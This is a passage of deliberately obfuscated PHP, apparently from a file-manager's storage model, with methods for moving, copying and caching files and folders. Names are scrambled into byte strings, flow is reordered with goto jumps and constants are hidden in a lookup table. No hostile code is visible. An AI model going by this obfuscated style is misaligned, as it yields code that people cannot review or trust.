$C²£ŒÔ–Õ‹ = count($a ÌæùˆÓ„); if ($C²£ŒÔ–Õ‹ == 0) { return $c‘Ë³‡¥¸; } goto aÙÜ§ç‘¸; e¤³»‚õ—: $DŞ›æ•²ÛÅ[$Dé‡¨‘ìç] = $c‘Ë³‡¥¸; $bî°¡ª¤¶ = array(); $Cğ®•†‚”á = array(); goto Aİ½³¼šõ; BµÜ§…•’‰: $cİáòÄÜ¤ =& $_SERVER[¢ÌÛ]; $A›¥ƒ¦¶æŒ = $this->sourceInfoCache($Dé‡¨‘ìç); $dÀ¹µŞĞŞó = $this->sourceInfoCache($c „¤¢ï³); goto cÁ¤„´çÕÑ; F÷“È†¯Ë²: if ($A›¥ƒ¦¶æŒ[$cİáòÄÜ¤[397]] != $cİáòÄÜ¤[86]) { $EÚ†‡‚Œğø[$cİáòÄÜ¤[527]][] = $A›¥ƒ¦¶æŒ[$cİáòÄÜ¤[445]]; return $c‘Ë³‡¥¸; } $a ÌæùˆÓ„ = array(); $f–ö½’¤Ó» = array(); goto a„Â²’¿’é; B••ßË ™: $c‘Ë³‡¥¸ = $this->add($f‰Ò—©Àò); $d§ÇÑì¿˜ô = array($cİáòÄÜ¤[396] => $c‘Ë³‡¥¸, $cİáòÄÜ¤[28] => $A³¯Ö¨Õ­”); $this->_copyApplyMeta($d§ÇÑì¿˜ô, $EÚ†‡‚Œğø); goto F÷“È†¯Ë²; Aİ½³¼šõ: foreach ($AèÍ½›ğ¨Ø as $f·è‹©£ì¬) { $e–§ô÷øŞØ = $f·è‹©£ì¬[$cİáòÄÜ¤[396]]; $fÑäÃë¤Î = $this->_childrenMatch($DŞ›æ•²ÛÅ, $f·è‹©£ì¬, $c×ßâ‡•õä); $bî°¡ª¤¶[] = array($cİáòÄÜ¤[396], $e–§ô÷øŞØ, $cİáòÄÜ¤[488], $fÑäÃë¤Î[$cİáòÄÜ¤[488]]); $Cğ®•†‚”á[] = array($cİáòÄÜ¤[396], $e–§ô÷øŞØ, $cİáòÄÜ¤[486], $fÑäÃë¤Î[$cİáòÄÜ¤[486]]); $this->_copyApplyMeta($f·è‹©£ì¬, $EÚ†‡‚Œğø); if ($f·è‹©£ì¬[$cİáòÄÜ¤[397]] != $cİáòÄÜ¤[86]) { $EÚ†‡‚Œğø[$cİáòÄÜ¤[527]][] = $f·è‹©£ì¬[$cİáòÄÜ¤[445]]; } } $this->chunkEventSet($cİáòÄÜ¤[539], array($cİáòÄÜ¤[540], $f‰Ò—©Àò, $C²£ŒÔ–Õ‹)); $this->saveAll($bî°¡ª¤¶); goto F­ñáìÄİÉ; dÔÕ‡Ê¾ùƒ: $this->addAll($f–ö½’¤Ó», array(), !1); $AèÍ½›ğ¨Ø = $this->where(array($cİáòÄÜ¤[488] => $c‘Ë³‡¥¸))->select(); $DŞ›æ•²ÛÅ = $this->_childrenMakeRelation($a ÌæùˆÓ„, $AèÍ½›ğ¨Ø); goto e¤³»‚õ—; cÁ¤„´çÕÑ: $f‰Ò—©Àò = $this->_makeItemData($A›¥ƒ¦¶æŒ, $dÀ¹µŞĞŞó, $A³¯Ö¨Õ­”); Hook::trigger($cİáòÄÜ¤[534], $f‰Ò—©Àò); Hook::trigger($cİáòÄÜ¤[535], array($cİáòÄÜ¤[536], $f‰Ò—©Àò, 0)); goto B••ßË ™; B³²‡¡°¨: } private function _childrenMakeRelation($AØ×‰ÖØ–Ã, $aåßŞÁ‡Öˆ) { $F„ÀğÙ´¹Û =& $_SERVER[¢ÌÛ]; $cƒíÔŒ‡å = array(); $aí°ÄØ¹ = array(); foreach ($AØ×‰ÖØ–Ã as $fÔ©œ’Õç‚) { $aÄ™†¶ÈÔ = $fÔ©œ’Õç‚[$F„ÀğÙ´¹Û[28]] . $F„ÀğÙ´¹Û[8] . $fÔ©œ’Õç‚[$F„ÀğÙ´¹Û[486]]; $cƒíÔŒ‡å[$aÄ™†¶ÈÔ] = $fÔ©œ’Õç‚[$F„ÀğÙ´¹Û[396]]; } foreach ($aåßŞÁ‡Öˆ as $fÔ©œ’Õç‚) { $aÄ™†¶ÈÔ = $fÔ©œ’Õç‚[$F„ÀğÙ´¹Û[28]] . $F„ÀğÙ´¹Û[8] . $fÔ©œ’Õç‚[$F„ÀğÙ´¹Û[486]]; $BãÄ¦æ«´© = $cƒíÔŒ‡å[$aÄ™†¶ÈÔ]; $aí°ÄØ¹[$BãÄ¦æ«´©] = $fÔ©œ’Õç‚[$F„ÀğÙ´¹Û[396]]; } return $aí°ÄØ¹; } private function _childrenMatch($bµ³‰İ§ÚÆ, $e—·Ñ—£Ê, $bää±…Æê) { goto B¼¨²÷ò—; FøêÜì¸ : foreach ($A×âî‰ÔïÔ as $Fµá›»¾Â) { if (isset($bµ³‰İ§ÚÆ[$Fµá›»¾Â])) { $bä¶Øò¼¯… .= $bµ³‰İ§ÚÆ[$Fµá›»¾Â] . $AÒ¦Ö¤Â“â[543]; } } $bä¶Øò¼¯… = rtrim($bä¶Øò¼¯…, $AÒ¦Ö¤Â“â[47]) . $AÒ¦Ö¤Â“â[47]; $Bã†Ì‰âªÀ = $this->parentLevelArray($bä¶Øò¼¯…); goto F®ÚÀ´·‰; F®ÚÀ´·‰: $cÄĞ“Ä÷è£ = $Bã†Ì‰âªÀ[count($Bã†Ì‰âªÀ) - 1]; return array($AÒ¦Ö¤Â“â[488] => $cÄĞ“Ä÷è£, $AÒ¦Ö¤Â“â[486] => $bä¶Øò¼¯…); goto fÍõÓæ‰¸; B¼¨²÷ò—: $AÒ¦Ö¤Â“â =& $_SERVER[¢ÌÛ]; $bä¶Øò¼¯… = $bää±…Æê[$AÒ¦Ö¤Â“â[486]]; $A×âî‰ÔïÔ = $this->parentLevelArray($e—·Ñ—£Ê[$AÒ¦Ö¤Â“â[486]]); goto FøêÜì¸ ; fÍõÓæ‰¸: } private function _makeItemData($dÃæùæ®ø‹, $CìøâÇì¼‹, $dé¡¥¢×) { $Aô¾–£³®± =& $_SERVER[¢ÌÛ]; $eòõŠ±˜’ä = array($Aô¾–£³®±[544] => $dÃæùæ®ø‹[$Aô¾–£³®±[397]], $Aô¾–£³®±[413] => $dé¡¥¢×, $Aô¾–£³®±[545] => $dÃæùæ®ø‹[$Aô¾–£³®±[399]], $Aô¾–£³®±[446] => $dÃæùæ®ø‹[$Aô¾–£³®±[445]], $Aô¾–£³®±[546] => $dÃæùæ®ø‹[$Aô¾–£³®±[77]], $Aô¾–£³®±[547] => $CìøâÇì¼‹[$Aô¾–£³®±[398]], $Aô¾–£³®±[548] => $CìøâÇì¼‹[$Aô¾–£³®±[483]], $Aô¾–£³®±[549] => USER_ID, $Aô¾–£³®±[550] => USER_ID, $Aô¾–£³®±[395] => $CìøâÇì¼‹[$Aô¾–£³®±[396]], $Aô¾–£³®±[551] => $CìøâÇì¼‹[$Aô¾–£³®±[486]] . $CìøâÇì¼‹[$Aô¾–£³®±[396]] . $Aô¾–£³®±[47], $Aô¾–£³®±[422] => 0, $Aô¾–£³®±[552] => $Aô¾–£³®±[33]); return $eòõŠ±˜’ä; } private function _copyApplyMeta($FÂƒïğÜ×¦, &$fÒ†ˆ—‰„) { $C·‘†ÉŠ =& $_SERVER[¢ÌÛ]; $BÑÊÚùƒæ¼ = $FÂƒïğÜ×¦[$C·‘†ÉŠ[396]]; $dğÈËÄ®Ìó = $FÂƒïğÜ×¦[$C·‘†ÉŠ[28]]; if (!isset($FÂƒïğÜ×¦[$C·‘†ÉŠ[553]]) || !$FÂƒïğÜ×¦[$C·‘†ÉŠ[553]] || $FÂƒïğÜ×¦[$C·‘†ÉŠ[553]] == $C·‘†ÉŠ[495]) { $fÒ†ˆ—‰„[$C·‘†ÉŠ[529]][] = array($C·‘†ÉŠ[396], $BÑÊÚùƒæ¼, $C·‘†ÉŠ[553], short_id($BÑÊÚùƒæ¼)); } if (Input::check($dğÈËÄ®Ìó, $C·‘†ÉŠ[554])) { $fÒ†ˆ—‰„[$C·‘†ÉŠ[528]][] = array($C·‘†ÉŠ[396] => $BÑÊÚùƒæ¼, $C·‘†ÉŠ[92] => $C·‘†ÉŠ[442], $C·‘†ÉŠ[368] => str_replace($C·‘†ÉŠ[50], $C·‘†ÉŠ[33], Pinyin::encode($dğÈËÄ®Ìó))); $fÒ†ˆ—‰„[$C·‘†ÉŠ[528]][] = array($C·‘†ÉŠ[396] => $BÑÊÚùƒæ¼, $C·‘†ÉŠ[92] => $C·‘†ÉŠ[441], $C·‘†ÉŠ[368] => Pinyin::encode($dğÈËÄ®Ìó, $C·‘†ÉŠ[555])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($AÀ›É§¯°å) { goto F’°¾ñÇ©—; F’°¾ñÇ©—: $d‡ ¹Šš…È =& $_SERVER[¢ÌÛ]; $d‚·™ÈßŞË = $this->sourceInfo($AÀ›É§¯°å); $bœŠëÌ³Éõ = $d‡ ¹Šš…È[424]; goto Dæ«Ó‚·¤; aì‹ÄÑ²Ÿß: $c‰÷À¬â¢Ø = array_to_keyvalue($c‰÷À¬â¢Ø, $d‡ ¹Šš…È[396]); foreach ($c‰÷À¬â¢Ø as $b×‹—´Èè) { $EÕ°ì¡äéÖ = $b×‹—´Èè[$d‡ ¹Šš…È[488]]; $AÀ›É§¯°å = $b×‹—´Èè[$d‡ ¹Šš…È[396]]; if (!isset($this->_childrenListCache[$AÀ›É§¯°å]) && $b×‹—´Èè[$d‡ ¹Šš…È[397]] == $d‡ ¹Šš…È[86]) { $this->_childrenListCache[$AÀ›É§¯°å] = array(); } if (!isset($this->_childrenListCache[$EÕ°ì¡äéÖ])) { $this->_childrenListCache[$EÕ°ì¡äéÖ] = array(); } $this->_childrenListCache[$EÕ°ì¡äéÖ][$AÀ›É§¯°å] = $b×‹—´Èè; $this->_childrenItemCache[$AÀ›É§¯°å] = $b×‹—´Èè; } goto d·¾¤÷; Dæ«Ó‚·¤: $b™¹¬»µ¥Ú = array($d‡ ¹Šš…È[486] => array($d‡ ¹Šš…È[510], $d‚·™ÈßŞË[$d‡ ¹Šš…È[486]] . $AÀ›É§¯°å . $d‡ ¹Šš…È[511]), $d‡ ¹Šš…È[423] => $this->targetIsDelete); $c‰÷À¬â¢Ø = $this->field($bœŠëÌ³Éõ)->where($b™¹¬»µ¥Ú)->select(); if (!$c‰÷À¬â¢Ø) { return; } goto aì‹ÄÑ²Ÿß; d·¾¤÷: } private function _childrenListAll($aÕ¢Î„åØò, &$EâµäÃ‡ä÷) { $Dªíò¤øŠ =& $_SERVER[¢ÌÛ]; if (!isset($this->_childrenListCache[$aÕ¢Î„åØò])) { return; } $eà ‰öùå = $this->_childrenListCache[$aÕ¢Î„åØò]; foreach ($eà ‰öùå as $bãØóàêĞø => $fŸ”¸øİß) { $EâµäÃ‡ä÷[$bãØóàêĞø] = $fŸ”¸øİß; if ($fŸ”¸øİß[$Dªíò¤øŠ[397]] == $Dªíò¤øŠ[86]) { $this->_childrenListAll($bãØóàêĞø, $EâµäÃ‡ä÷); } } } private function sourceInfoCache($cˆÕ÷é‹œ¤) { if (isset($this->_childrenItemCache[$cˆÕ÷é‹œ¤])) { return $this->_childrenItemCache[$cˆÕ÷é‹œ¤]; } return $this->sourceInfo($cˆÕ÷é‹œ¤); } private function _childrenList($Bà°ª÷¿í’) { if (isset($this->_childrenListCache[$Bà°ª÷¿í’])) { return $this->_childrenListCache[$Bà°ª÷¿í’]; } return $this->_childrenListSelect($Bà°ª÷¿í’); } private function _childrenListSelect($c¨ì„Îè‰á) { goto E…Á“òø¢á; CŠ°Ä—”: foreach ($CÕäË´ƒæ as $c¨ì„Îè‰á => $f³ÖÏ’·ƒ÷) { $this->_childrenItemCache[$c¨ì„Îè‰á] = $f³ÖÏ’·ƒ÷; } return $CÕäË´ƒæ; goto C½¶Âïâíë; Cóİ¥õ­ó©: $Eò¯×É¼Ó‹ = $Eò¯×É¼Ó‹ ? $Eò¯×É¼Ó‹ : array(); $CÕäË´ƒæ = array_to_keyvalue($Eò¯×É¼Ó‹, $Bõ–ÅêÄÉ×[396]); $this->_childrenListCache[$c¨ì„Îè‰á] = $CÕäË´ƒæ; goto CŠ°Ä—”; E…Á“òø¢á: $Bõ–ÅêÄÉ× =& $_SERVER[¢ÌÛ]; $fš„‘Õê = array($Bõ–ÅêÄÉ×[488] => $c¨ì„Îè‰á, $Bõ–ÅêÄÉ×[423] => $this->targetIsDelete); $Eò¯×É¼Ó‹ = $this->where($fš„‘Õê)->select(); goto Cóİ¥õ­ó©; C½¶Âïâíë: } private function fileNameExistCache($d‘ÜÑ…æ÷™, $C¯¸ÑÃ®‡’) { $d¹ˆ¤æå¢ =& $_SERVER[¢ÌÛ]; $C¯¸ÑÃ®‡’ = strtolower($C¯¸ÑÃ®‡’); $bë³ª´’é = $this->_childrenList($d‘ÜÑ…æ÷™); foreach ($bë³ª´’é as $B˜Û”·Îó¿) { if ($C¯¸ÑÃ®‡’ == strtolower($B˜Û”·Îó¿[$d¹ˆ¤æå¢[28]])) { return $B˜Û”·Îó¿[$d¹ˆ¤æå¢[396]]; } } return !1; } private function fileNameAutoCache($A™÷–é»™, $EßË·„Åçµ, $f©Çù×‡ì, $AÁÉ…â»Ñ) { $d±¼îºÁ·› =& $_SERVER[¢ÌÛ]; $eğÙ¶†á‹” = $this->_childrenList($A™÷–é»™); $f•öˆĞ©¾ = array_to_keyvalue($eğÙ¶†á‹”, $d±¼îºÁ·›[33], $d±¼îºÁ·›[28]); return $this->fileNameAutoGet($f•öˆĞ©¾, $EßË·„Åçµ, $f©Çù×‡ì, $AÁÉ…â»Ñ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($FŠ‡—öÔÆè, $DˆŒ§å±®, $e¦º¼Ë­ = REPEAT_REPLACE, $dÜ¥öË”Š“ = '') { goto C§ÑÑƒÕ; D÷ª°ËÁ›Í: $this->lockMoveEnd($FŠ‡—öÔÆè); $this->lockWriteEnd($DˆŒ§å±®, $A”íÃ¸®õ); $this->folderSizeReset($bµêŠø†²­[$Aˆï´Áù‡[488]]); goto AÕ‘åñ‹à¯; aÄõ»åš¶¸: if ($bµêŠø†²­[$Aˆï´Áù‡[488]] == $c±ê·îÂ[$Aˆï´Áù‡[396]]) { if ($bµêŠø†²­[$Aˆï´Áù‡[423]] == $Aˆï´Áù‡[86]) { Model($Aˆï´Áù‡[421])->restore(array($FŠ‡—öÔÆè)); } if (!$dÜ¥öË”Š“ || $dÜ¥öË”Š“ == $bµêŠø†²­[$Aˆï´Áù‡[28]]) { return $FŠ‡—öÔÆè; } } $c–çò¼õà† = $this->pathInfoMore($FŠ‡—öÔÆè); if ($this->isParentOf($FŠ‡—öÔÆè, $DˆŒ§å±®)) { return !1; } goto b‡æ³Ç“®; dèæŠ†ß¶’: return $E¥ğùƒ»¼; goto f­àÔŸ¢¿œ; AÕ‘åñ‹à¯: $this->folderSizeReset($DˆŒ§å±®); $eñÃ®¹¦ = array($bµêŠø†²­[$Aˆï´Áù‡[488]], $DˆŒ§å±®); if ($bµêŠø†²­[$Aˆï´Áù‡[397]] == $Aˆï´Áù‡[86]) { $eñÃ®¹¦[] = $FŠ‡—öÔÆè; } goto E¸ªÂ‰Í±ì; AâÆ‡ ™»: if ($bµêŠø†²­[$Aˆï´Áù‡[488]] == $DˆŒ§å±® && $dÜ¥öË”Š“ != $bµêŠø†²­[$Aˆï´Áù‡[28]]) { $dë›¬½¬“¢ = $this->fileNameExist($DˆŒ§å±®, $dÜ¥öË”Š“); if ($dë›¬½¬“¢ && $bµêŠø†²­[$Aˆï´Áù‡[397]] == $Aˆï´Áù‡[495]) { goto Dµ¾’Óäˆæ; Dµ¾’Óäˆæ: $Cİì‰å…Ï = $this->sourceInfo($dë›¬½¬“¢); $eÄ«ß£×±› = $this->fileHistory($Cİì‰å…Ï, $bµêŠø†²­[$Aˆï´Áù‡[445]], $bµêŠø†²­[$Aˆï´Áù‡[77]]); if (!$eÄ«ß£×±›) { Model($Aˆï´Áù‡[448])->remove($bµêŠø†²­[$Aˆï´Áù‡[445]]); } goto b³‡¨¾ƒâ; A‘ÚÑ—ƒæö: return $dë›¬½¬“¢; goto få½ğÁ £Ï; b³‡¨¾ƒâ: $this->removeNow($FŠ‡—öÔÆè, !1); $this->folderSizeReset($DˆŒ§å±®); Hook::trigger($Aˆï´Áù‡[557], $c–çò¼õà†); goto A‘ÚÑ—ƒæö; få½ğÁ £Ï: } } $A”íÃ¸®õ = $dÜ¥öË”Š“ ? $dÜ¥öË”Š“ : $bµêŠø†²­[$Aˆï´Áù‡[28]]; $this->lockMoveStart($FŠ‡—öÔÆè); goto C¾÷ Ì£; C§ÑÑƒÕ: $Aˆï´Áù‡ =& $_SERVER[¢ÌÛ]; $bµêŠø†²­ = $this->sourceInfo($FŠ‡—öÔÆè); $c±ê·îÂ = $this->sourceInfo($DˆŒ§å±®); goto aÄõ»åš¶¸; b‡æ³Ç“®: if (!$bµêŠø†²­ || !$c±ê·îÂ || $c±ê·îÂ[$Aˆï´Áù‡[397]] != $Aˆï´Áù‡[86]) { return !1; } Hook::trigger($Aˆï´Áù‡[556], $c–çò¼õà†); $this->targetIsDelete = intval($bµêŠø†²­[$Aˆï´Áù‡[423]]); goto AâÆ‡ ™»; Bœ¡ç¹‹…å: $D—ˆ–ĞÚæ = $this->fileNameExistCache($DˆŒ§å±®, $bµêŠø†²­[$Aˆï´Áù‡[28]]); $E¥ğùƒ»¼ = $this->_move($FŠ‡—öÔÆè, $DˆŒ§å±®, $e¦º¼Ë­, $E¿Õ‘†‡, $dÜ¥öË”Š“); $this->sourceCacheClear(); goto CĞë¿ğØ‡Ñ; C¾÷ Ì£: $this->lockWriteStart($DˆŒ§å±®, $A”íÃ¸®õ); $E¿Õ‘†‡ = array($Aˆï´Áù‡[527] => array(), $Aˆï´Áù‡[558] => !1); $this->clearShare($FŠ‡—öÔÆè, $DˆŒ§å±®); goto Bœ¡ç¹‹…å; E¸ªÂ‰Í±ì: $this->updateModifyTime($eñÃ®¹¦); Model($Aˆï´Áù‡[531])->eventMove($FŠ‡—öÔÆè, $bµêŠø†²­[$Aˆï´Áù‡[488]], $DˆŒ§å±®); Hook::trigger($Aˆï´Áù‡[557], $c–çò¼õà†); goto dèæŠ†ß¶’; CĞë¿ğØ‡Ñ: if ($bµêŠø†²­[$Aˆï´Áù‡[397]] == $Aˆï´Áù‡[86] && $D—ˆ–ĞÚæ) { $this->folderSizeResetChildren($E¥ğùƒ»¼); } Model($Aˆï´Áù‡[173])->linkAdd($E¿Õ‘†‡[$Aˆï´Áù‡[527]]); if ($D—ˆ–ĞÚæ && $E¿Õ‘†‡[$Aˆï´Áù‡[558]]) { $this->removeNow($FŠ‡—öÔÆè, !1); } goto D÷ª°ËÁ›Í; f­àÔŸ¢¿œ: } private function _move($d¨ëÌò¹î†, $fØ¥±íÙŠ, $D£ï˜¬ˆÆÀ, &$fˆ¹òˆ×í‘, $F’ˆÒ®¿¡Š = '') { goto Cä™¨å‘”; Cä™¨å‘”: $E§¹¬­Š–Ğ =& $_SERVER[¢ÌÛ]; $Cè‰Ö¯µŞ = $this->sourceInfo($d¨ëÌò¹î†); $F¨Ô§®Æ‚™ = $Cè‰Ö¯µŞ[$E§¹¬­Š–Ğ[397]] == $E§¹¬­Š–Ğ[86]; goto dïéî›µõÁ; bÏÙÉ§‚ïÄ: $this->lockWriteStart($fØ¥±íÙŠ, $E´Ê¥§˜ì³); if (!$EÔˆ¯¿ÔË¤) { return $this->_moveForce($d¨ëÌò¹î†, $fØ¥±íÙŠ, $E´Ê¥§˜ì³); } $Bƒ¤õí† = $EÔˆ¯¿ÔË¤; goto F§éæÌ³êÉ; dïéî›µõÁ: $E´Ê¥§˜ì³ = $F’ˆÒ®¿¡Š ? $F’ˆÒ®¿¡Š : $Cè‰Ö¯µŞ[$E§¹¬­Š–Ğ[28]]; $EÔˆ¯¿ÔË¤ = $this->fileNameExistCache($fØ¥±íÙŠ, $E´Ê¥§˜ì³); $this->lockMoveStart($d¨ëÌò¹î†); goto bÏÙÉ§‚ïÄ; F§éæÌ³êÉ: $dã¦Ò¿•§° = !1; if ($F¨Ô§®Æ‚™) { if ($D£ï˜¬ˆÆÀ == REPEAT_RENAME_FOLDER) { $E´Ê¥§˜ì³ = $this->fileNameAuto($fØ¥±íÙŠ, $E´Ê¥§˜ì³, $D£ï˜¬ˆÆÀ, $F¨Ô§®Æ‚™); $Bƒ¤õí† = $this->_moveForce($d¨ëÌò¹î†, $fØ¥±íÙŠ, $E´Ê¥§˜ì³); } else { if ($D£ï˜¬ˆÆÀ == REPEAT_RENAME_FOLDER) { $D£ï˜¬ˆÆÀ = REPEAT_RENAME; } $eìİƒÃŒœ» = $this->_childrenListSelect($d¨ëÌò¹î†); foreach ($eìİƒÃŒœ» as $Eâƒ™ƒ‘¤) { $this->_move($Eâƒ™ƒ‘¤[$E§¹¬­Š–Ğ[396]], $EÔˆ¯¿ÔË¤, $D£ï˜¬ˆÆÀ, $fˆ¹òˆ×í‘); } $dã¦Ò¿•§° = !0; } } else { if ($D£ï˜¬ˆÆÀ == REPEAT_SKIP) { $dã¦Ò¿•§° = !0; } else { if ($D£ï˜¬ˆÆÀ == REPEAT_RENAME || $D£ï˜¬ˆÆÀ == REPEAT_RENAME_FOLDER) { $E´Ê¥§˜ì³ = $this->fileNameAuto($fØ¥±íÙŠ, $E´Ê¥§˜ì³, $D£ï˜¬ˆÆÀ, $F¨Ô§®Æ‚™); $Bƒ¤õí† = $this->_moveForce($d¨ëÌò¹î†, $fØ¥±íÙŠ, $E´Ê¥§˜ì³); } else { if ($D£ï˜¬ˆÆÀ == REPEAT_REPLACE) { $aÎ²ˆÉº»â = $this->sourceInfoCache($EÔˆ¯¿ÔË¤); $FòŒ¾ø ¼® = $this->fileHistory($aÎ²ˆÉº»â, $Cè‰Ö¯µŞ[$E§¹¬­Š–Ğ[445]], $Cè‰Ö¯µŞ[$E§¹¬­Š–Ğ[77]]); if ($FòŒ¾ø ¼®) { $fˆ¹òˆ×í‘[$E§¹¬­Š–Ğ[527]][] = $Cè‰Ö¯µŞ[$E§¹¬­Š–Ğ[445]]; } else { $dã¦Ò¿•§° = !0; } } } } } if ($dã¦Ò¿•§° && !$fˆ¹òˆ×í‘[$E§¹¬­Š–Ğ[558]]) { $fˆ¹òˆ×í‘[$E§¹¬­Š–Ğ[558]] = !0; } goto B‘™ŞéàÛ; B‘™ŞéàÛ: return $Bƒ¤õí†; goto c‹’™Š³Ø; c‹’™Š³Ø: } private function _moveForce($c…Ğ„¨ŒÊŠ, $fÒÔ‡º‡â¬, $eÂÔæ¨©) { goto bÄµ‰ö£÷§; Fš±Ú‘ó¯Ä: if (!$Cš½ÎÒÛ›‡) { Model($c³ªÕš×ŞŒ[481])->authClear($c…Ğ„¨ŒÊŠ); } $fÌˆöˆÀÏË = $D¢îğôà‹[$c³ªÕš×ŞŒ[423]] == $c³ªÕš×ŞŒ[86] && $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[423]] != $c³ªÕš×ŞŒ[86]; if ($fÌˆöˆÀÏË) { $b¿™¤®§¢å[$c³ªÕš×ŞŒ[422]] = 0; } goto dÖİ—àÎÀ; bÄµ‰ö£÷§: $c³ªÕš×ŞŒ =& $_SERVER[¢ÌÛ]; $D¢îğôà‹ = $this->sourceInfo($c…Ğ„¨ŒÊŠ); $D»Â¼„ñ µ = $this->sourceInfo($fÒÔ‡º‡â¬); goto Dæ¥Œ–Ã°Î; Dæ¥Œ–Ã°Î: $b­•Ö¢ó Ú = $D¢îğôà‹[$c³ªÕš×ŞŒ[397]] == $c³ªÕš×ŞŒ[86]; $b¿™¤®§¢å = array($c³ªÕš×ŞŒ[395] => $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[396]], $c³ªÕš×ŞŒ[551] => $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[486]] . $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[396]] . $c³ªÕš×ŞŒ[47], $c³ªÕš×ŞŒ[547] => $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[398]], $c³ªÕš×ŞŒ[548] => $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[483]], $c³ªÕš×ŞŒ[550] => USER_ID, $c³ªÕš×ŞŒ[413] => $eÂÔæ¨©); $Cš½ÎÒÛ›‡ = $D¢îğôà‹[$c³ªÕš×ŞŒ[398]] == SourceModel::TYPE_GROUP && $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[398]] == SourceModel::TYPE_GROUP && $D¢îğôà‹[$c³ªÕš×ŞŒ[483]] == $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[483]]; goto Fš±Ú‘ó¯Ä; dÖİ—àÎÀ: if ($b­•Ö¢ó Ú) { $dÂ÷÷ç•‡Î = array($c³ªÕš×ŞŒ[551] => array($c³ªÕš×ŞŒ[510], $D¢îğôà‹[$c³ªÕš×ŞŒ[486]] . $D¢îğôà‹[$c³ªÕš×ŞŒ[396]] . $c³ªÕš×ŞŒ[511])); $fºÂÄ†ìãŒ = $D¢îğôà‹[$c³ªÕš×ŞŒ[486]] . $D¢îğôà‹[$c³ªÕš×ŞŒ[396]] . $c³ªÕš×ŞŒ[47]; $e¶‰ñ‰Êš² = $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[486]] . $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[396]] . $c³ªÕš×ŞŒ[47] . $D¢îğôà‹[$c³ªÕš×ŞŒ[396]] . $c³ªÕš×ŞŒ[47]; $BêöŸĞÔ– = array($c³ªÕš×ŞŒ[551] => array($c³ªÕš×ŞŒ[559], "\x72\x65\160\154\x61\x63\x65\50\x70\x61\162\145\156\164\114\x65\x76\145\x6c\x2c\x27{$fºÂÄ†ìãŒ}\47\x2c\x27{$e¶‰ñ‰Êš²}\x27\x29"), $c³ªÕš×ŞŒ[547] => $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[398]], $c³ªÕš×ŞŒ[548] => $D»Â¼„ñ µ[$c³ªÕš×ŞŒ[483]]); if ($fÌˆöˆÀÏË) { $BêöŸĞÔ–[$c³ªÕš×ŞŒ[422]] = 0; } $this->where($dÂ÷÷ç•‡Î)->data($BêöŸĞÔ–)->save(); } $this->where(array($c³ªÕš×ŞŒ[410] => $c…Ğ„¨ŒÊŠ))->data($b¿™¤®§¢å)->save(); return $c…Ğ„¨ŒÊŠ; goto DÇãñ“Ÿ´’; DÇãñ“Ÿ´’: } private function clearShare($CÑ÷Í¶×Ó¤, $e¾öë¾ºÚ‚) { goto BÂáÏ²Ëå; Aˆ¨ƒĞ³µ¨: if (!$BùÈ½ˆÛ÷®) { return; } $BùÈ½ˆÛ÷® = array_to_keyvalue($BùÈ½ˆÛ÷®, $b‰“Àæ—³è[33], $b‰“Àæ—³è[466]); $b’ğŠ¬·ÔÇ = array($b‰“Àæ—³è[466] => array($b‰“Àæ—³è[7], $BùÈ½ˆÛ÷®)); goto Cğ­‡§¨Ù®; Cğ­‡§¨Ù®: Model($b‰“Àæ—³è[561])->where($b’ğŠ¬·ÔÇ)->save(array($b‰“Àæ—³è[473] => 0)); Model($b‰“Àæ—³è[562])->where($b’ğŠ¬·ÔÇ)->delete(); goto fè †÷—§è; BÂáÏ²Ëå: $b‰“Àæ—³è =& $_SERVER[¢ÌÛ]; $FÑ´’äëù = $this->sourceInfo($CÑ÷Í¶×Ó¤); $F­Êµ†„¾ = $this->sourceInfo($e¾öë¾ºÚ‚); goto f˜¹š‚œ×; f˜¹š‚œ×: if ($FÑ´’äëù[$b‰“Àæ—³è[483]] == $F­Êµ†„¾[$b‰“Àæ—³è[483]] && $FÑ´’äëù[$b‰“Àæ—³è[398]] == $b‰“Àæ—³è[560]) { return; } $b’ğŠ¬·ÔÇ = array($b‰“Àæ—³è[486] => array($b‰“Àæ—³è[510], $FÑ´’äëù[$b‰“Àæ—³è[486]] . $CÑ÷Í¶×Ó¤ . $b‰“Àæ—³è[511])); $fªÂ”•¢¿› = $this->field($b‰“Àæ—³è[410])->where($b’ğŠ¬·ÔÇ)->getField($b‰“Àæ—³è[396], !0); goto cµÁÆ³’•­; cµÁÆ³’•­: if (!$fªÂ”•¢¿›) { return; } $b’ğŠ¬·ÔÇ = array($b‰“Àæ—³è[396] => array($b‰“Àæ—³è[7], $fªÂ”•¢¿›), $b‰“Àæ—³è[473] => 1); $BùÈ½ˆÛ÷® = Model($b‰“Àæ—³è[561])->field($b‰“Àæ—³è[466])->where($b’ğŠ¬·ÔÇ)->select(); goto Aˆ¨ƒĞ³µ¨; fè †÷—§è: } public function copyFolderFromIO($A‰Š¿«¸’, $Eè™…°â„°, $fğñŒ÷Šğè, $cƒŒ™²İ•, $E‚êËâ­ÆÔ, $b›òÀÕƒÇƒ = false) { goto cˆ¹„®à×½; fĞö±ÀĞƒâ: Hook::trigger($DÄŒäÊÔˆÚ[565]); if ($A­Îòƒªø) { $this->folderSizeResetChildren($A­Îòƒªø); } $this->_childrenListClear(); goto B¹ÈáÊ¼•Œ; c´ˆæ¨Â‡ß: if ($EáÈ‡Æ‹„) { $this->_childrenAllMake($EáÈ‡Æ‹„); } Hook::trigger($DÄŒäÊÔˆÚ[564]); $this->_copyChildTo($A‰Š¿«¸’, $Eè™…°â„°, $A­Îòƒªø, $cƒŒ™²İ•, $AåÖ±ğ¿èµ, $E‚êËâ­ÆÔ); goto fĞö±ÀĞƒâ; b¶Å»‰•: $this->updateModifyTime($fğñŒ÷Šğè); return $A­Îòƒªø; goto e®Ş“÷ĞÈï; b„ƒ‡Äº”æ: $EáÈ‡Æ‹„ = $this->fileNameExist($fğñŒ÷Šğè, 